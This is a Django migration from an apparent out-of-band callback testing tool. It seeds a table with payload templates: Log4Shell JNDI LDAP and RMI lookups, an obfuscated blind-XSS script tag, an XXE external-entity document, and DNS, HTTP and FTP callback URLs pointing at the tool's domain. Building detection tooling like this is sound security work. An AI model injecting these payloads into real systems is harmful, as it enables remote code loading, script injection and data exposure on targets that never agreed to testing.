# Generated by Django 3.2.9 on 2023-06-05 03:04

from django.db import migrations


class Migration(migrations.Migration):

    dependencies = [
        ('template', '0005_rename_templates_urltemplate_template'),
    ]

    operations = [
        migrations.RunSQL(
            """
INSERT INTO antenna.template_url(id, payload, template_id) VALUES (1,'{key}.{domain}',1);
INSERT INTO antenna.template_url(id, payload, template_id) VALUES (2,'ldap://{domain}:{jndi_port}/{key}',2);
INSERT INTO antenna.template_url(id, payload, template_id) VALUES (3,'${jndi:ldap://{domain}:{jndi_port}/{key}}',2);
INSERT INTO antenna.template_url(id, payload, template_id) VALUES (4,'rmi://{domain}:{jndi_port}/{key}',3);
INSERT INTO antenna.template_url(id, payload, template_id) VALUES (5,'${jndi:rmi://{domain}:{jndi_port}/{key}}',3);
INSERT INTO antenna.template_url(id, payload, template_id) VALUES (6,'<sCRiPt sRC=//{domain}/{key}></sCrIpT>',4);
INSERT INTO antenna.template_url(id, payload, template_id) VALUES (7,'http://{domain}/{key}',5);
INSERT INTO antenna.template_url(id, payload, template_id) VALUES (8,'<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE ANY [
<!ENTITY % xd SYSTEM "http://{domain}/{key}">
    %xd;
]>
<root>&bbbb;</root>',6);
INSERT INTO antenna.template_url(id, payload, template_id) VALUES (9,'http://{key}.{domain}',7);
INSERT INTO antenna.template_url(id, payload, template_id) VALUES (10,'ftp://{key}:123456@{domain}/antenna',8);
INSERT INTO antenna.template_url(id, payload, template_id) VALUES (11,'https://{key}.{domain}',9);


"""
        ), ]
